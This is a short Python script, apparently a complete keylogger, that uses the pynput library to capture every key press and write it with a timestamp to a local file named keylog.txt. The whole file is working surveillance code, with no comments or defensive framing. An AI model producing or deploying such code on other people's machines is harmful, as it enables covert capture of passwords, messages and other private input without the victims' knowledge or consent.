import pynput
from pynput.keyboard import Listener
import logging

log_directory = ''
logging.basicConfig(filename=(log_directory + 'keylog.txt'), level=logging.DEBUG, format= '%(asctime)s : %(message)s')

def keypress (Key):
    logging.info(str(Key))

with Listener (on_press = keypress) as listener:
        listener.join()

